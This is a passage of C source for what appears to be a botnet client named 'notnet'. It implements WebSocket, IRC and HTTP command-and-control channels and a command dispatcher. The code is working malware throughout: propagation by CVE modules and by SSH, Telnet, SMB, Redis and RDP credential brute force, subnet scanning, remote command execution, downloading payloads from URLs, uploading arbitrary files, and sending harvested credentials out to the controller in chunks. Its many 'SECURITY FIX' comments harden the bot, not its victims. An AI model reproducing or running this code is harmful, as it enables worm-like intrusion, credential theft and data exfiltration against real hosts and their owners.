    char *accept_hdr = strstr(response, "Sec-WebSocket-Accept:");
    int accept_ok = 0;
    if (accept_hdr) {
        char *val = accept_hdr + strlen("Sec-WebSocket-Accept:");
        while (*val == ' ' || *val == '\t') val++;
        char got[64];
        int i = 0;
        while (val[i] && val[i] != '\r' && val[i] != '\n' && i < (int)sizeof(got) - 1) {
            got[i] = val[i];
            i++;
        }
        got[i] = '\0';
        if (strcmp(got, expect) == 0) {
            accept_ok = 1;
        } else {
            log_warn("WS: Sec-WebSocket-Accept mismatch (got '%s', expected '%s')",
                     got, expect);
        }
    } else {
        log_warn("WS: missing Sec-WebSocket-Accept header");
    }
    if (!accept_ok) {
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }
    log_info("WS: RFC 6455 handshake complete (%s)", expect);

    fcntl(sock, F_SETFL, flags);
    
    bot->c2_ws.sock = sock;
    bot->c2_ws.connected = 1;
    /* SECURITY FIX (#10): Pin IP on first successful WS connection.
     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
    if (!bot->flux_enabled && !bot->c2_ws.dns_pinned) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        getpeername(sock, (struct sockaddr *)&sin, &slen);
        bot->c2_ws.pinned_addr = sin.sin_addr;
        bot->c2_ws.dns_pinned = 1;
    }
    log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
    
    return 0;
}

/* ── WebSocket Protocol Helpers ───────────────────────────────── */
/* SECURITY FIX (#22): Implement proper RFC 6455 WebSocket framing.
 * Previously ws_send/ws_read sent/received raw data without frame headers. */

/* Generate a random 4-byte masking key for client-to-server frames */
static void ws_make_mask(uint8_t *mask) {
    /* SECURITY FIX (#37): Use getrandom() — a predictable mask lets an
     * on-path observer unmask/forge C2 frames. */
    if (random_bytes(mask, 4) != 0) {
        mask[0] = rand() & 0xFF;
        mask[1] = rand() & 0xFF;
        mask[2] = rand() & 0xFF;
        mask[3] = rand() & 0xFF;
    }
}

/* Apply WebSocket mask to payload data in-place */
static void ws_apply_mask(uint8_t *data, size_t len, const uint8_t *mask) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= mask[i % 4];
    }
}

int ws_send(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_ws.connected) return -1;

    /* Build RFC 6455 frame:
     * Byte 0: FIN(1) + RSV(0) + Opcode(1=text)
     * Byte 1: MASK(1, client must mask) + Payload len(7)
     * Then: 4-byte mask key
     * Then: masked payload */
    uint8_t header[14];  /* max header size for 64-bit payload length */
    int hdr_len = 0;

    /* FIN bit set + opcode 1 (text frame) */
    header[hdr_len++] = 0x81;

    /* Masking bit set (client-to-server) */
    uint8_t mask[4];
    ws_make_mask(mask);

    if (len < 126) {
        header[hdr_len++] = 0x80 | (uint8_t)len;
    } else if (len < 65536) {
        header[hdr_len++] = 0x80 | 126;
        header[hdr_len++] = (len >> 8) & 0xFF;
        header[hdr_len++] = len & 0xFF;
    } else {
        header[hdr_len++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--) {
            header[hdr_len++] = (len >> (i * 8)) & 0xFF;
        }
    }

    /* Append mask key */
    memcpy(header + hdr_len, mask, 4);
    hdr_len += 4;

    /* Copy data to a temp buffer for masking */
    /* SECURITY FIX (#25): Use dynamic allocation for masked payload to
     * avoid silent truncation of messages > 2048 bytes. */
    int send_len = len;
    char *masked = (char *)malloc(send_len);
    if (!masked) {
        log_error("ws_send: malloc failed for %d bytes", send_len);
        return -1;
    }
    memcpy(masked, data, send_len);
    ws_apply_mask((uint8_t *)masked, send_len, mask);

    /* Send header + masked payload */
    int hdr_sent = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)header, hdr_len);
    if (hdr_sent < 0) {
        log_warn("ws_send: header send failed: %s", strerror(errno));
        free(masked);
        return -1;
    }
    int result = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, masked, send_len);
    free(masked);
    return result;
}

int ws_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_ws.connected) return -1;

    if (tls_pending(&bot->c2_ws.tls) <= 0) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(bot->c2_ws.sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    }

    /* SECURITY FIX (#40): read the full 2-byte frame header. A single
     * recv() can return 1 byte (partial read) — frame_hdr[1] would stay
     * uninitialized and the opcode/length parse below would use garbage. */
    uint8_t frame_hdr[2] = {0, 0};
    size_t hdr_got = 0;
    while (hdr_got < sizeof(frame_hdr)) {
        ssize_t r = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got);
        if (r == -2) {
            /* SECURITY FIX (#121): TLS control record consumed, no app data. */
            return 0;
        }
        if (r <= 0) {
            /* SECURITY FIX (#85): advance the flux IP so the reconnect
             * targets the next A record. */
            flux_mark_failed(bot, bot->c2_ws.server);
            bot->c2_ws.connected = 0;
            if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
            return -1;
        }
        hdr_got += (size_t)r;
    }

    int fin = (frame_hdr[0] & 0x80) >> 7;
    int opcode = frame_hdr[0] & 0x0F;
    (void)fin;  /* FIN bit: not checking fragmentation (C2 messages are small) */
    int masked = (frame_hdr[1] & 0x80) >> 7;
    uint8_t payload_len = frame_hdr[1] & 0x7F;

    /* Determine actual payload length */
    int plen = payload_len;
    if (plen == 126) {
        uint8_t ext[2] = {0};
        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 2) != 2) return -1;
        plen = (ext[0] << 8) | ext[1];
    } else if (plen == 127) {
        uint8_t ext[8] = {0};
        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 8) != 8) return -1;
        plen = 0;
        for (int i = 0; i < 8; i++) {
            plen = (plen << 8) | ext[i];
        }
    }

    /* Read mask key if present (server-to-client frames are unmasked,
     * but we handle both cases) */
    uint8_t mask[4] = {0};
    if (masked) {
        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)mask, 4) != 4) return -1;
    }

    /* Read payload.
     * #182: if the declared plen exceeds our buffer we MUST consume the
     * whole frame anyway — the leftover bytes would otherwise be parsed as
     * the next frame header, letting a MITM smuggle a crafted second
     * "frame" past the boundary checks. Oversized frames are drained and
     * reported as no-data. */
    int truncated = 0;
    if (plen > len - 1) {
        truncated = 1;
    }
    int total = 0;
    while (total < plen) {
        char sink[512];
        char *dst = truncated ? sink : (buf + total);
        int want = plen - total;
        if (!truncated && want > len - 1 - total) want = len - 1 - total;
        if (truncated && want > (int)sizeof(sink)) want = (int)sizeof(sink);
        int n = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, dst, want);
        if (n <= 0) break;
        total += n;
    }

    if (truncated) {
        log_warn("WS: frame of %d bytes exceeds buffer %d — drained and dropped",
                 plen, len);
        return 0;
    }
    if (total <= 0) return -1;

    /* Unmask if needed */
    if (masked) {
        for (int i = 0; i < total; i++) {
            buf[i] ^= mask[i % 4];
        }
    }

    /* Handle control frames (close, ping, pong) by returning 0 */
    if (opcode == 0x8 || opcode == 0x9 || opcode == 0xA) {
        if (opcode == 0x8) {
            /* Close frame - send close frame back and disconnect */
            uint8_t close_frame[] = { 0x88, 0x00 };
            chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)close_frame, 2);
        }
        return 0;
    }

    buf[total] = '\0';
    return total;
}

void ws_disconnect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) {
        bot->c2_ws.connected = 0;
        if (bot->c2_ws.sock >= 0) {
            tls_close(&bot->c2_ws.tls);
            close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
        }
        log_info("WS: disconnected");
    }
}

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot) {
    /* Try IRC first (fast, lightweight) */
    if (bot->c2_enabled & C2_IRC) {
        if (!bot->c2_irc.connected) {
            if (irc_connect(bot) == 0) {
                irc_send(bot, "JOIN %s", bot->c2_irc.channel);
                bot->c2_irc.joined = 0;
            }
        } else if (!bot->c2_irc.joined && bot->c2_irc.authenticated) {
            /* Send JOIN once after authentication */
            irc_send(bot, "JOIN %s", bot->c2_irc.channel);
            bot->c2_irc.joined = 1;
            log_info("IRC: sent JOIN %s", bot->c2_irc.channel);
        }
    }
    
    /* Try HTTP if IRC fails */
    if (bot->c2_enabled & C2_HTTP) {
        if (!bot->c2_http.connected) {
            http_connect(bot);
        }
    }
    
    /* Try WebSocket as backup */
    if (bot->c2_enabled & C2_WS) {
        if (!bot->c2_ws.connected) {
            ws_connect(bot);
        }
    }
    
    return 0;
}

/* SECURITY FIX (#120): the WS channel previously queued the RAW JSON frame
 * ({"cmd":...,"args":...,"secret":...}) into cmd_queue, but dispatch matches
 * command prefixes (strncmp(cmd, CMD_EXEC, ...)) — so a WS-served command
 * was silently never executed. Mirror the HTTP extraction: pull "cmd" and
 * "args" out of the frame into a "cmd args" string, bounded. Returns 1 on
 * success, 0 on no/malformed cmd. */
static int ws_extract_command(const char *frame, char *out, size_t out_sz) {
    /* #181: use the shared escape-aware json_find_string for both fields
     * so the WS extractor can no longer desync from the secret gate. */
    char cmd[128];
    if (!json_find_string(frame, "cmd", cmd, sizeof(cmd)) || out_sz < 2)
        return 0;
    size_t clen = strlen(cmd);
    if (clen == 0 || clen >= 128) return 0;

    char args[256] = {0};
    size_t alen = 0;
    if (json_find_string(frame, "args", args, sizeof(args))) {
        alen = strlen(args);
    }

    int n;
    if (alen > 0) {
        n = snprintf(out, out_sz, "%s %s", cmd, args);
    } else {
        n = snprintf(out, out_sz, "%s", cmd);
    }
    return (n > 0 && (size_t)n < out_sz) ? 1 : 0;
}

int protocol_process_commands(notnet_bot_t *bot) {
    /* SECURITY FIX (#9): Use separate buffers per channel to prevent
     * one channel's read from overwriting another's queued command. */
    char irc_buf[1024];
    char http_buf[1024];
    char ws_buf[1024];

    /* #170: the mesh listen thread pushes onto cmd_queue concurrently.
     * Hold the queue lock for the whole read+process pass so its pushes
     * and our compaction can't interleave. */
    mesh_cmd_queue_lock();

    
    /* Check IRC - always read when connected, auth may not be set yet */
    if (bot->c2_irc.connected) {
        int result = irc_read(bot, irc_buf, sizeof(irc_buf));
        if (result == 1) {
            /* New command in buffer - add to queue.
             * #174: nick-prefix trust alone is spoofable on networks
             * without services; when an irc_pass is configured, require it
             * to have been accepted too (authenticated implies PASS ok —
             * a server that got the wrong PASS never sends 366/376, so
             * authenticated stays 0 and commands are refused). */
            if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", irc_buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Check HTTP - read responses for queued commands */
    if (bot->c2_http.connected) {
        memset(http_buf, 0, sizeof(http_buf));
        int result = http_read(bot, http_buf, sizeof(http_buf));
        if (result > 0) {
            log_info("HTTP: http_read returned %d bytes", result);
            /* SECURITY FIX (#24): Skip HTTP headers before parsing JSON.
             * Headers may contain "cmd" in unexpected places. */
            char *body = strstr(http_buf, "\r\n\r\n");
            if (body) body += 4;
            else body = http_buf;
            /* SECURITY FIX (#35): Auth gate — only trust command JSON
             * that echoes our shared secret. HTTP previously queued any
             * command found in the response with no authentication
             * (CWE-306), unlike the IRC nick allowlist. */
            if (!http_body_has_secret(bot, body)) {
                log_warn("HTTP: command rejected — response did not echo shared secret");
            } else {
            /* Parse JSON command from response body only.
             * #181: both fields now come through json_find_string —
             * escape-aware and bounded, so a value containing \" can no
             * longer desync the extractor from the secret gate (#175). */
            char http_cmd[128];
            if (json_find_string(body, "cmd", http_cmd, sizeof(http_cmd))) {
                int clen = (int)strlen(http_cmd);
                if (clen > 0 && clen < 254 && bot->cmd_count < 256) {
                    memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                    memcpy(bot->cmd_queue[bot->cmd_count], http_cmd, (size_t)clen);
                    bot->cmd_queue[bot->cmd_count][clen] = '\0';
                    /* Extract args value and append to command */
                    char args_val[256];
                    if (json_find_string(body, "args", args_val, sizeof(args_val))) {
                        int alen = (int)strlen(args_val);
                        if (alen > 0 && clen + 1 + alen < 255) {
                            char combined[256];
                            memcpy(combined, bot->cmd_queue[bot->cmd_count], (size_t)clen);
                            combined[clen] = ' ';
                            memcpy(combined + clen + 1, args_val, (size_t)alen);
                            combined[clen + 1 + alen] = '\0';
                            snprintf(bot->cmd_queue[bot->cmd_count], 256,
                                     "%.255s", combined);
                        }
                    }
                    bot->cmd_count++;
                    log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                }
            }
            } /* end else (secret verified) */
        }
    }
    
    /* Check WebSocket */
    if (bot->c2_ws.connected) {
        int result = ws_read(bot, ws_buf, sizeof(ws_buf));
        if (result > 0) {
            /* SECURITY FIX (#35): Same auth gate as HTTP — only trust
             * frames that echo the shared secret. */
            if (http_body_has_secret(bot, ws_buf)) {
                /* SECURITY FIX (#120): extract cmd/args from the JSON frame
                 * instead of queueing the raw frame — dispatch matches
                 * command prefixes, so the raw JSON was never executed. */
                char extracted[256];
                if (bot->cmd_count < 256 &&
                    ws_extract_command(ws_buf, extracted, sizeof(extracted))) {
                    snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", extracted);
                    bot->cmd_count++;
                    log_info("WS: command: %s", extracted);
                }
            } else {
                log_warn("WS: command rejected — frame did not echo shared secret");
            }
        }
    }
    
    /* Process queued commands */
    /* SECURITY FIX (#14): Rate limit - max 10 commands per second */
    time_t now = time(NULL);
    if (now != bot->last_cmd_time) {
        bot->last_cmd_time = now;
        bot->cmd_this_second = 0;
    }
    /* SECURITY FIX (#27): Process up to 10 commands per second, defer excess.
     * Previously: if rate limit hit, ALL commands dropped (cmd_count=0).
     * (#107): the deferral was cosmetic — skipped commands sat in the queue
     * but the unconditional cmd_count=0 at the end wiped them anyway, so the
     * behavior was identical to the pre-#27 bug for the deferred entries.
     * Now: compact the deferred commands to the queue front and keep
     * cmd_count at the deferred count, so they are processed next second. */
    int skipped = 0;
    int keep = 0;   /* write index for deferred (skipped) commands */

    for (int i = 0; i < bot->cmd_count; i++) {
        char *cmd = bot->cmd_queue[i];
        if (bot->cmd_this_second >= 10) {
            log_warn("CMD: rate limit exceeded, deferring command %d", i);
            skipped++;
            if (keep != i) {
                /* Move the deferred entry to the front so it survives the
                 * queue reset below (cmd_queue is 256-byte rows; rows never
                 * overlap). */
                memmove(bot->cmd_queue[keep], bot->cmd_queue[i], 256);
            }
            keep++;
            continue;
        }
        bot->cmd_this_second++;

        /* #184: kill is a one-way door — once latched, stop executing the
         * rest of this tick's queue instead of running commands after it. */
        if (bot->kill_pending) {
            log_warn("CMD: kill_pending latched — dropping remaining queued commands");
            break;
        }

        if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
            char *args = cmd + strlen(CMD_SPREAD);
            while (*args == ' ' || *args == '\t') args++;
            /* #96: bulk form — `spread <subnet>` (e.g. 192.168.1.0/24)
             * runs the threaded CVE-first spreader over the whole range,
             * so scan discovery can drive propagation without one
             * `spread <ip>:<port>` command per host. */
            if (strchr(args, '/')) {
                log_info("CMD: spread subnet %s", args);
                uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
                if (spawn_scan_threads(bot, args, all_services) == 0) {
                    bot->scan_count++;
                }
                continue;
            }
            /* Parse target:port */
            char host[256] = {0};
            uint16_t port = 0;
            if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                log_info("CMD: spread %s:%d", host, port);
                int spread_ok = -1;
                /* #83: CVE-first — known-CVE modules are the primary
                 * vector; brute-force spreaders run only as fallback. */
                if (cve_run_modules(bot, host, port) == 0) {
                    spread_ok = 0;
                } else {
                    switch (port) {
                        case 22:
                        case 2222:  /* Cowrie SSH alt-port in the sim honeypot tier */
                            spread_ok = spread_ssh(bot, host, port); break;
                        case 23:
                        case 2223:  /* Cowrie Telnet alt-port in the sim honeypot tier */
                            spread_ok = spread_telnet(bot, host, port); break;
                        case 445: spread_ok = spread_smb(bot, host, port); break;
                        case 6379: spread_ok = spread_redis(bot, host, port); break;
                        case 3389: spread_ok = spread_rdp(bot, host, port); break;
                        default:
                            /* Unknown port: log and skip. Bruting a port that
                             * answered as non-SSH (e.g. an HTTP service on 80)
                             * burns the whole 475-credential pool at ~1s per
                             * attempt against the banner timeout — ~8 minutes
                             * blocking the single command loop, so heartbeats
                             * stop and the C2 marks the bot stale. The CVE
                             * modules above are the vector for such ports. */
                            log_info("CMD: spread no vector for %s:%d (no CVE module matched)", host, port);
                            spread_ok = -1; break;
                    }
                }
                if (spread_ok == 0) {
                    bot->scan_count++;
                }
            } else {
                log_info("CMD: spread invalid format, use target:port");
            }
        } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
            /* SECURITY FIX (#68/#79): Implement scan. Syntax:
             *   scan <subnet>            -> scan subnet (e.g. 192.168.1.0/24)
             *   scan <ip>:<port,...>     -> scan specific ports on one IP
             *   scan <ip>                -> scan default ports on one IP
             * Results are returned via protocol_send_response(). */
            char *args = cmd + strlen(CMD_SCAN);
            while (*args == ' ' || *args == '\t') args++;

            if (args[0] == '\0') {
                protocol_send_response(bot, CMD_SCAN,
                    "scan: usage 'scan <subnet>' or 'scan <ip>[:<port,...>]'");
            } else if (strchr(args, '/')) {
                /* Subnet scan using the configured service mask */
                uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
                if (scan_subnet(bot, args, all_services) == 0) {
                    protocol_send_response(bot, CMD_SCAN, "scan: subnet complete");
                } else {
                    protocol_send_response(bot, CMD_SCAN, "scan: invalid subnet");
                }
            } else {
                /* Single IP: optional explicit port list, else defaults */
                static const uint16_t default_ports[] = { 22, 23, 445, 6379, 3389 };
                char *ports_str = strchr(args, ':');
                uint16_t ports[16];
                int port_count = 0;
                char target_ip[64] = {0};

                if (ports_str) {
                    int ilen = (int)(ports_str - args);
                    if (ilen > 63) ilen = 63;
                    memcpy(target_ip, args, ilen);
                    target_ip[ilen] = '\0';
                    /* parse comma-separated ports */
                    char *saveptr = NULL;
                    char *tok = strtok_r(ports_str + 1, ",", &saveptr);
                    while (tok && port_count < 16) {
                        int p = atoi(tok);
                        if (p > 0 && p <= 65535) ports[port_count++] = (uint16_t)p;
                        tok = strtok_r(NULL, ",", &saveptr);
                    }
                    if (port_count == 0) {
                        protocol_send_response(bot, CMD_SCAN, "scan: no valid ports");
                        continue;
                    }
                } else {
                    snprintf(target_ip, sizeof(target_ip), "%.63s", args);
                    port_count = (int)(sizeof(default_ports) / sizeof(default_ports[0]));
                    memcpy(ports, default_ports, sizeof(default_ports));
                }

                char *result = scan_ports(target_ip, ports, port_count);
                if (result) {
                    protocol_send_response(bot, CMD_SCAN, result);
                    free(result);
                } else {
                    protocol_send_response(bot, CMD_SCAN, "scan: error");
                }
            }
        } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
            /* SECURITY: exec replaced popen() with a strict allowlist + execve().
             * Only commands in the allowlist are permitted. The command name
             * and single argument are tokenized by whitespace into fixed-size
             * argv. No shell is ever invoked. */
            char *args = cmd + strlen(CMD_EXEC);
            while (*args == ' ' || *args == '\t') args++;

            /* Allowlist of permitted commands — #179: absolute paths only.
             * execvp() PATH resolution let a planted directory earlier in
             * PATH shadow the allowlisted binary when the bot runs as
             * root. Resolving to fixed locations removes the lookup. */
            static const char *allowlist[][2] = {
                { "uname",    "/bin/uname" },
                { "date",     "/bin/date" },
                { "uptime",   "/usr/bin/uptime" },
                { "whoami",   "/usr/bin/whoami" },
                { "id",       "/usr/bin/id" },
                { "ls",       "/bin/ls" },
                { "ifconfig", "/sbin/ifconfig" },
                { "hostname", "/bin/hostname" },
                { "netstat",  "/bin/netstat" },
                { "ps",       "/bin/ps" },
                { NULL, NULL }
            };
            char cmd_name[64];
            char arg1[256];
            cmd_name[0] = arg1[0] = '\0';

            /* Parse up to one token as the command name */
            if (sscanf(args, "%63s", cmd_name) != 1) {
                log_warn("CMD: exec rejected (no command)");
                protocol_send_response(bot, CMD_EXEC, "exec rejected: no command");
                continue;
            }

            /* Check allowlist */
            const char *exec_path = NULL;
            for (int a = 0; allowlist[a][0]; a++) {
                if (strcmp(cmd_name, allowlist[a][0]) == 0) {
                    exec_path = allowlist[a][1];
                    break;
                }
            }
            if (!exec_path) {
                log_warn("CMD: exec rejected (not in allowlist): %s", cmd_name);
                protocol_send_response(bot, CMD_EXEC, "exec rejected: command not allowed");
                continue;
            }

            /* Optional single argument (e.g. "uname -a").
             * #179: more than one extra token is rejected loudly instead of
             * silently truncating — "exec ls -la /tmp" used to run just
             * "-la". */
            char *sp = args + strlen(cmd_name);
            while (*sp == ' ' || *sp == '\t') sp++;
            if (*sp) {
                snprintf(arg1, sizeof(arg1), "%255s", sp);
                char *extra = strchr(arg1, ' ');
                if (!extra) extra = strchr(arg1, '\t');
                if (extra) {
                    log_warn("CMD: exec rejected (one argument max): %s", args);
                    protocol_send_response(bot, CMD_EXEC,
                        "exec rejected: one optional argument only");
                    continue;
                }
            }

            log_info("CMD: exec: allowlist hit: %s %s", cmd_name, arg1);

            char output[1024] = {0};
            int pipefd[2];
            if (pipe(pipefd) < 0) {
                log_error("CMD: exec pipe failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, "exec failed: pipe error");
                continue;
            }

            pid_t pid = fork();
            if (pid < 0) {
                close(pipefd[0]);
                close(pipefd[1]);
                log_error("CMD: exec fork failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, "exec failed: fork error");
                continue;
            }

            if (pid == 0) {
                /* Child: close read end, redirect stdout to pipe, exec */
                /* SECURITY FIX (#30): Close C2 sockets in child before exec
                 * to prevent the child process from inheriting sensitive
                 * file descriptors (IRC/HTTP/WS sockets). */
                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
                close(pipefd[0]);
                dup2(pipefd[1], STDOUT_FILENO);
                /* Also redirect stderr to stdout to capture all output */
                dup2(pipefd[1], STDERR_FILENO);
                close(pipefd[1]);

                char *argv[] = { cmd_name, arg1[0] ? arg1 : NULL, NULL };
                /* #179: exec the pinned absolute path, no PATH lookup */
                execvp(exec_path, argv);
                _exit(127);
            }

            /* Parent: read output, wait for child */
            close(pipefd[1]);
            size_t n = 0;
            int status;
            while (n < sizeof(output) - 1) {
                ssize_t r = read(pipefd[0], output + n, sizeof(output) - 1 - n);
                if (r <= 0) break;
                n += (size_t)r;
            }
            close(pipefd[0]);
            output[n] = '\0';
            waitpid(pid, &status, 0);

            int exit_code = -1;
            if (WIFEXITED(status)) {
                exit_code = WEXITSTATUS(status);
            } else if (WIFSIGNALED(status)) {
                log_warn("CMD: exec killed by signal %d", WTERMSIG(status));
            }
            log_info("CMD: exec output (%zu bytes, exit %d)", n, exit_code);
            protocol_send_response(bot, CMD_EXEC, output);
        } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
            /* SECURITY FIX (#66): Actually fetch the URL and write to the
             * requested path. Syntax: download <url> <path>.
             * #178 (honest framing): the metacharacter check below is NOT
             * path scoping — it only prevents shell breakage in code that
             * no longer shells out. The destination is arbitrary by design
             * (the C2 controls this bot); do not mistake the check for a
             * containment boundary. */
            char *args = cmd + strlen(CMD_DOWNLOAD);
            while (*args == ' ' || *args == '\t') args++;

            char url[1024] = {0};
            char dest[512] = {0};

            char *sp = strchr(args, ' ');
            if (sp) {
                int ulen = (int)(sp - args);
                if (ulen > 1000) ulen = 1000;
                memcpy(url, args, ulen);
                url[ulen] = '\0';
                char *dp = sp + 1;
                while (*dp == ' ' || *dp == '\t') dp++;
                snprintf(dest, sizeof(dest), "%.500s", dp);
            } else {
                snprintf(url, sizeof(url), "%.1000s", args);
                snprintf(dest, sizeof(dest), "/tmp/.notnet.download");
            }

            if (url[0] == '\0') {
                protocol_send_response(bot, CMD_DOWNLOAD,
                    "download: usage 'download <url> [path]'");
            } else if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
                /* SECURITY FIX (#111): only http(s):// is implemented.
                 * http_download() parses both; https:// upgrades to TLS when
                 * the build has TLS_ENABLED and a cert pin is configured
                 * (#135). An unrecognized scheme is rejected explicitly — no
                 * silent substitution of the wrong resource. */
                protocol_send_response(bot, CMD_DOWNLOAD,
                    "download: url must start with http:// or https://");
            } else if (strpbrk(dest, ";|&`$(){}[]<>!\n\r")) {
                protocol_send_response(bot, CMD_DOWNLOAD,
                    "download: path rejected (dangerous character)");
            } else {
                int got = http_download(bot, url, dest);
                if (got > 0) {
                    char resp[512];
                    snprintf(resp, sizeof(resp), "download ok: %d bytes to %s", got, dest);
                    protocol_send_response(bot, CMD_DOWNLOAD, resp);
                } else {
                    protocol_send_response(bot, CMD_DOWNLOAD, "download failed");
                }
            }
        } else if (strncmp(cmd, CMD_UPLOAD, strlen(CMD_UPLOAD)) == 0) {
            /* Parse: upload <local_path> [remote_path] */
            char *args = cmd + strlen(CMD_UPLOAD);
            while (*args == ' ' || *args == '\t') args++;

            char local_path[512] = {0};
            char remote_path[512] = {0};

            /* Parse local path (first arg, up to space) */
            char *space = strchr(args, ' ');
            if (space) {
                int len = space - args;
                if (len > 511) len = 511;
                memcpy(local_path, args, len);
                local_path[len] = '\0';

                /* Parse remote path (optional second arg) */
                char *rem = space + 1;
                while (*rem == ' ' || *rem == '\t') rem++;
                if (*rem) {
                    strncpy(remote_path, rem, 511);
                    remote_path[511] = '\0';
                }
            } else {
                /* No space — entire arg is local path, use default remote */
                strncpy(local_path, args, 511);
                local_path[511] = '\0';
            }

            /* #178 (honest framing): metachar check only — NOT path scoping.
             * The read side is arbitrary by design (C2-controlled bot). */
            const char *bad = strpbrk(local_path, ";|&`$(){}[]<>!");
            if (bad) {
                log_warn("CMD: upload rejected (dangerous char in path: %s)", local_path);
                protocol_send_response(bot, CMD_UPLOAD, "upload rejected: dangerous char in path");
            } else if (local_path[0] == '\0') {
                protocol_send_response(bot, CMD_UPLOAD, "upload: no file path specified, use 'upload <path> [remote_path]'");
            } else {
                int result = http_upload(bot, local_path, remote_path[0] ? remote_path : NULL);
                if (result > 0) {
                    char resp[256];
                    snprintf(resp, sizeof(resp), "upload ok: %d bytes to %s", result,
                             remote_path[0] ? remote_path : bot->c2_http.path);
                    protocol_send_response(bot, CMD_UPLOAD, resp);
                } else {
                    protocol_send_response(bot, CMD_UPLOAD, "upload failed: could not upload file");
                }
            }
        } else if (strncmp(cmd, CMD_EXFIL_CREDS, strlen(CMD_EXFIL_CREDS)) == 0) {
            /* #90: Credential-log exfil — stream the buffered harvest to
             * the C2 in chunks (mirrors the CMD_EXFIL file-exfil path),
             * then clear the buffer so capacity resets for the next
             * harvest. Auth is the channel-level shared-secret gate that
             * already vetted this command (http_body_has_secret / WS
             * frame echo), the same as every other CMD_*. Placed BEFORE
             * CMD_EXFIL because "exfil_creds" is a strict prefix of
             * "exfil" and strncmp would otherwise swallow this branch. */
            unsigned int ncreds = spread_cred_count();
            char *data = NULL;
            size_t dlen = 0;
            if (spread_creds_drain(&data, &dlen) != 0 || dlen == 0) {
                protocol_send_response(bot, CMD_EXFIL_CREDS,
                    "exfil_creds: no credentials buffered");
            } else {
                const int CHUNK = 1024;
                int offset = 0;
                int total_sent = 0;
                while (offset < (int)dlen) {
                    int chunk = (int)dlen - offset;
                    if (chunk > CHUNK) chunk = CHUNK;

                    if (offset == 0) {
                        /* First chunk: send via protocol_send_response.
                         * #169: bound the memcpy by the REMAINING space,
                         * not just rlen — the old guard checked only
                         * rlen < sizeof(resp), one constant away from a
                         * stack overflow. Clamp chunk to what fits. */
                        char resp[2048];
                        int rlen = snprintf(resp, sizeof(resp),
                            "exfil_creds chunk: %d/%d bytes", chunk, (int)dlen);
                        if (rlen > 0 && rlen < (int)sizeof(resp)) {
                            int space = (int)sizeof(resp) - 1 - rlen;
                            if (chunk > space) chunk = space;
                            if (chunk > 0) {
                                memcpy(resp + rlen, data + offset, (size_t)chunk);
                                rlen += chunk;
                            }
                            resp[rlen] = '\0';
                        }
                        protocol_send_response(bot, CMD_EXFIL_CREDS, resp);
                    } else {
                        /* Subsequent chunks: send via HTTP POST */
                        char upload_path[512];
                        snprintf(upload_path, sizeof(upload_path),
                            "%s/exfil", bot->c2_http.path);
                        char tmp[256];
                        snprintf(tmp, sizeof(tmp), "/tmp/.creds.%d", offset);
                        FILE *tf = fopen(tmp, "wb");
                        if (tf) {
                            fwrite(data + offset, 1, chunk, tf);
                            fclose(tf);
                            http_upload(bot, tmp, upload_path);
                            unlink(tmp);
                        }
                    }

                    offset += chunk;
                    total_sent += chunk;
                }
                log_info("CMD: exfil_creds completed: %d bytes (%u creds) drained",
                         total_sent, ncreds);
                free(data);
            }
        } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
            /* Parse: exfil <path> */
            char *args = cmd + strlen(CMD_EXFIL);
            while (*args == ' ' || *args == '\t') args++;

            char file_path[512] = {0};
            strncpy(file_path, args, 511);
            file_path[511] = '\0';

            /* Validate path */
            const char *bad = strpbrk(file_path, ";|&`$(){}[]<>!");
            if (bad) {
                log_warn("CMD: exfil rejected (dangerous char in path: %s)", file_path);
